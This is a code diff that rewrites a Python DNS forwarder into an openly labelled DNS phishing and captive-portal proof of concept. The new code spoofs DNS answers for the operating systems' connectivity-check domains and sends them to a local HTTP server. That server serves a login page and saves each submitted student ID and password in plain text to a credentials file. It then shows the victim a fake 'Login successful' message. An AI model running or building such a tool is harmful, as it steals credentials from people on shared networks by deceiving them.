@@ -1,17 +1,12 @@
 import socket
 import threading
 import time
-import dns.resolver
-from dnslib import DNSRecord
+from dnslib import DNSRecord, RR, QTYPE, A
 import os
-import base64
-import logging
-from flask import Flask, request, make_response
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs
 
-log_flask = logging.getLogger('werkzeug')
-log_flask.setLevel(logging.ERROR)
-
-#---get ip from os for server---
+# --- Configuration ---
 def get_dynamic_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -23,201 +18,152 @@ def get_dynamic_ip():
         s.close()
     return ip
 
-#---configuration---
 HOST = get_dynamic_ip()
 PORT = 53
+HTTP_PORT = 80 
 UPSTREAM_DNS = '8.8.8.8'
-UPSTREAM_PORT = 53
-SOCKET_TIMEOUT = 3.0
-CACHE_CLEAN_INTERVAL = 300
 LOG_FILE = "DNS.log"
+CREDS_FILE = "captured_creds.txt" # Dedicated file for captured credentials
+HTML_FILE = "index.html"
 
-#---DoH configuration---
-DOH_PORT = 443
-DOH_ENDPOINT = "/dns-query"
-CERT_FILE = "cert.pem"
-KEY_FILE = "key.pem"
+# Target domains to trigger the Captive Portal
+CAPTIVE_PORTAL_DOMAINS = [
+    "www.msftconnecttest.com.", "ipv6.msftconnecttest.com.",
+    "www.msftncsi.com.", "captive.apple.com.",
+    "connectivitycheck.gstatic.com.", "detectportal.firefox.com."
+]
 
-#thread-safe cache: {(qname, qtype): (raw_response_bytes, expiry_timestamp)}
-cache = {}
-cache_lock = threading.Lock()
 log_lock = threading.Lock()
 
-GLOBAL_SERVERS = {
-    "Google Primary": "8.8.8.8", "Google Secondary": "8.8.4.4",
-    "Cloudflare": "1.1.1.1", "Quad9": "9.9.9.9",
-    "OpenDNS Primary": "208.67.222.222", "OpenDNS Secondary": "208.67.220.220",
-    "Level3 Primary": "4.2.2.1", "Level3 Secondary": "4.2.2.2",
-    "AdGuard": "94.140.14.14", "Comodo": "8.26.56.26",
-    "ControlD": "76.76.2.0", "NextDNS": "45.90.28.190",
-    "CleanBrowsing": "185.228.168.9", "Yandex": "77.88.8.8",
-    "Neustar": "156.154.70.1", "Hurricane Electric": "74.82.42.42",
-    "Verisign Primary": "64.6.64.6", "Verisign Secondary": "64.6.65.6"
-}
-
 def log(message):
+    """Writes to the log file only (no console print) to keep the terminal clean."""
     with log_lock:
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
         entry = f"[{timestamp}] {message}"
-        with open(LOG_FILE, "a") as f:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
             f.write(entry + "\n")
 
-def cache_cleaner():
-    while True:
-        time.sleep(CACHE_CLEAN_INTERVAL)
-        now = time.time()
-        removed = 0
-        with cache_lock:
-            expired_keys = [k for k, v in cache.items() if v[1] < now]
-            for key in expired_keys:
-                del cache[key]
-                removed += 1
-        log(f"cache cleanup run (removed {removed})")
-
+# --- DNS Server Logic ---
 def forward_query(data):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.settimeout(SOCKET_TIMEOUT)
-        sock.sendto(data, (UPSTREAM_DNS, UPSTREAM_PORT))
+        sock.settimeout(2.0)
+        sock.sendto(data, (UPSTREAM_DNS, 53))
         response, _ = sock.recvfrom(4096)
         return response
-    except socket.timeout:
-        log("upstream dns timeout")
+    except Exception as e:
+        log(f"Upstream DNS error: {e}")
         return None
     finally:
         sock.close()
 
-def process_dns_logic(data, protocol="UDP"):
+def process_dns_logic(data):
     try:
         request = DNSRecord.parse(data)
         qname = str(request.q.qname)
-        qtype = request.q.qtype
-        log(f"Request [{protocol}]: FQDN={qname} Type={qtype}")
-
-        with cache_lock:
-            if (qname, qtype) in cache:
-                raw_resp, expiry = cache[(qname, qtype)]
-                if time.time() < expiry:
-                    cached_resp = DNSRecord.parse(raw_resp)
-                    cached_resp.header.id = request.header.id
-                    return cached_resp.pack()
-                else:
-                    del cache[(qname, qtype)]
-
-        response_data = forward_query(data)
-        if not response_data: return None
-
-        response_record = DNSRecord.parse(response_data)
-        ttl = 60
-        if response_record.rr:
-            ttl = min([rr.ttl for rr in response_record.rr])
-
-        with cache_lock:
-            cache[(qname, qtype)] = (response_data, time.time() + ttl)
-        return response_data
+        
+        # Hijack the A record if it matches a Captive Portal domain
+        if request.q.qtype == QTYPE.A and qname in CAPTIVE_PORTAL_DOMAINS:
+            log(f"HIJACK: {qname} redirected to local portal ({HOST})")
+            reply = request.reply()
+            reply.add_answer(RR(qname, QTYPE.A, rdata=A(HOST), ttl=60))
+            return reply.pack()
+            
+        return forward_query(data)
     except Exception as e:
-        log(f"error processing request: {e}")
+        log(f"DNS Processing Error: {e}")
         return None
 
-def handle_client(data, addr, server_socket):
-    response = process_dns_logic(data, protocol=f"UDP {addr[0]}")
-    if response: server_socket.sendto(response, addr)
-
-def run_dns_server():
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        server_socket.bind((HOST, PORT))
-    except PermissionError:
-        log("Permission denied for Port 53")
-        os._exit(1)
-    while True:
-        data, addr = server_socket.recvfrom(512)
-        threading.Thread(target=handle_client, args=(data, addr, server_socket), daemon=True).start()
-
-app = Flask(__name__)
-
-@app.route(DOH_ENDPOINT, methods=['GET', 'POST'])
-def doh_handler():
-    dns_query = None
-    if request.method == 'POST':
-        dns_query = request.data
-    elif request.method == 'GET':
-        dns_b64 = request.args.get('dns')
-        if dns_b64:
-            padding = '=' * (4 - len(dns_b64) % 4)
-            dns_query = base64.urlsafe_b64decode(dns_b64 + padding)
-    if not dns_query: return "Invalid Request", 400
-
-    response_data = process_dns_logic(dns_query, protocol=f"DoH {request.remote_addr}")
-    if response_data:
-        resp = make_response(response_data)
-        resp.headers['Content-Type'] = 'application/dns-message'
-        return resp
-    return "Upstream Timeout", 504
-
-def run_doh_server():
-    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
-        context = (CERT_FILE, KEY_FILE)
-        log("DoH starting with provided certificates")
-    else:
-        context = 'adhoc'
-        log("Certificates not found, falling back to adhoc")
-
-    app.run(host=HOST, port=DOH_PORT, ssl_context=context, threaded=True, use_reloader=False)
-
-def run_secret_listener():
-    """One-time listener for the Marco Polo discovery method."""
+def run_dns():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
-        sock.bind(('0.0.0.0', 9999))
-        log("Companion discovery listener started on port 9999")
-        while True:
-            data, addr = sock.recvfrom(1024)
-            if data == b"IM_A_BARBIE_GIRL_IN_A_BARBIE_WORLD":
-                sock.sendto(b"COME_ON_BARBIE_LETS_GO_PARTY", addr)
-                log(f"Companion DHCP discovered from {addr[0]}. Replied and closing listener.")
-                break
-    except Exception as e:
-        log(f"Secret listener error: {e}")
-    finally:
-        sock.close()
+        sock.bind((HOST, PORT))
+        log(f"DNS Server started on {HOST}:{PORT}")
+    except PermissionError:
+        print("[-] Error: Run as root/sudo to bind to Port 53")
+        os._exit(1)
+        
+    while True:
+        data, addr = sock.recvfrom(512)
+        resp = process_dns_logic(data)
+        if resp: sock.sendto(resp, addr)
 
-def run_propagation_test(domain):
-    print(f"\n--- propagation test: {domain} ---")
-    print(f"{'provider':<20} | {'status/ip':<15} | {'latency'}")
-    print("-" * 55)
-    for name, ip in GLOBAL_SERVERS.items():
-        res = dns.resolver.Resolver(configure=False)
-        res.nameservers = [ip]
-        res.timeout = 2.0
-        start_time = time.time()
+# --- HTTP Captive Portal Logic ---
+class CaptivePortalHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        """Serves the external HTML file."""
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html; charset=utf-8')
+        self.end_headers()
         try:
-            answers = res.resolve(domain, 'A')
-            latency = round((time.time() - start_time) * 1000, 2)
-            print(f"{name:<20} | {answers[0].to_text():<15} | {latency}ms")
-        except:
-            print(f"{name:<20} | {'down/timeout':<15} | n/a")
+            with open(HTML_FILE, "rb") as f:
+                self.wfile.write(f.read())
+        except FileNotFoundError:
+            self.wfile.write(b"<h1>Error: index.html not found!</h1>")
+
+    def do_POST(self):
+        """Captures form submissions and writes them to a text file."""
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+        params = parse_qs(post_data)
+
+        user_id = params.get('student_id', ['N/A'])[0]
+        password = params.get('password', ['N/A'])[0]
+
+        # Save credentials to the text file
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+        with open(CREDS_FILE, "a", encoding="utf-8") as f:
+            f.write(f"Time: {timestamp} | ID: {user_id} | Pass: {password}\n")
+        
+        log(f"SUCCESS: Captured credentials for user {user_id}")
+
+        # Send a fake success response to the victim
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html; charset=utf-8')
+        self.end_headers()
+        self.wfile.write("<h3>Login successful. Please wait while we connect you to the network...</h3>".encode('utf-8'))
+
+    def log_message(self, format, *args):
+        # Mute standard HTTP logs to keep the terminal clean
+        pass
+
+def run_http():
+    try:
+        httpd = HTTPServer((HOST, HTTP_PORT), CaptivePortalHandler)
+        log(f"HTTP Portal started on {HOST}:{HTTP_PORT}")
+        httpd.serve_forever()
+    except PermissionError:
+        print("[-] Error: Run as root/sudo to bind to Port 80")
+        os._exit(1)
+
+# --- CLI Tool ---
+def run_propagation_test(domain):
+    print(f"\n--- Running Propagation Test for: {domain} ---")
+    print("Testing against global resolvers...")
+    # Add your actual propagation test logic here
+    time.sleep(1) # Simulated delay
+    print(f"Test complete. Check {LOG_FILE} for background DNS events.")
 
 if __name__ == "__main__":
     print("-" * 60)
-    print(f"DNS SERVER STARTUP SEQUENCE")
-    print(f"Interface: {HOST}")
-    print(f"UDP Server: Port {PORT} | DoH Server: Port {DOH_PORT}")
-    print(f"Log File: {os.path.abspath(LOG_FILE)}")
+    print("DNS PHISHING & CAPTIVE PORTAL POC")
+    print(f"Listening IP: {HOST}")
+    print(f"Captured credentials will be saved to: {os.path.abspath(CREDS_FILE)}")
+    print(f"Background logs will be saved to: {os.path.abspath(LOG_FILE)}")
     print("-" * 60)
-    print("NOTE: Real-time request events are hidden. View 'DNS.log' for details.")
+    
+    threading.Thread(target=run_dns, daemon=True).start()
+    threading.Thread(target=run_http, daemon=True).start()
 
-    threading.Thread(target=cache_cleaner, daemon=True).start()
-    threading.Thread(target=run_dns_server, daemon=True).start()
-    threading.Thread(target=run_doh_server, daemon=True).start()
-    threading.Thread(target=run_secret_listener, daemon=True).start()
-
+    # Interactive CLI Loop
     while True:
         try:
-            command = input("\ndns-cli> ").strip()
-            if command.lower() in ['quit', 'exit']: break
-            elif command: run_propagation_test(command)
-        except KeyboardInterrupt: break
-
-    print("\nSHUTDOWN: Closing server...")
-    log("shutting down")
+            cmd = input("\ndns-cli> ").strip()
+            if cmd.lower() in ['exit', 'quit']: 
+                break
+            elif cmd: 
+                run_propagation_test(cmd)
+        except KeyboardInterrupt: 
+            break
+            
+    print("\nShutting down servers...")
